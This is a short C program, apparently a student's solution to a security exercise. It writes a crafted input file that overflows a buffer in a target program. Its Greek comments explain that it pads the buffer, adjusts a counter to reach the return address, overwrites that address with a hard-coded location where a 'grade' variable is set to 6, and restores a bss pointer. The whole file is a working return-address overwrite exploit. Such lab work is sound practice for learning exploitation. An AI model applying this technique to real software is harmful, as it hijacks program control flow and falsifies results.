#include<stdio.h>

int main(){
	int  i=0;
    FILE *fp;
    fp = fopen("createdata6.txt", "w+");
    fprintf(fp,"theodoros chalkidis"); /*to onoma mou 19 grammata*/
    fputc('\0',fp);
	for ( i=0; i<28; i++ ){ /*gemizw ton buf mexri na ftasw sto i */
		fputc(0,fp);
	}
    fputc(56,fp);     /*kanw to i 56 wste na midenisei to return address*/

    fputc('\x68',fp);   /*grafw panw sto return adress auto pu thelw*/
    fputc('\x8b',fp);   /*<main+74> einai o stoxos opou to grade ginete 6*/
    fputc('\x04',fp);
    fputc('\x08',fp);

    fputc('\xe0',fp);   /* ksanagrafw tin dieuthinsi to s (bss) gia na min */
    fputc('\x65',fp);   /* tin katastrepsw */
    fputc('\x0d',fp);
    fputc('\x08',fp);
   
    fclose(fp);
	return 0;

}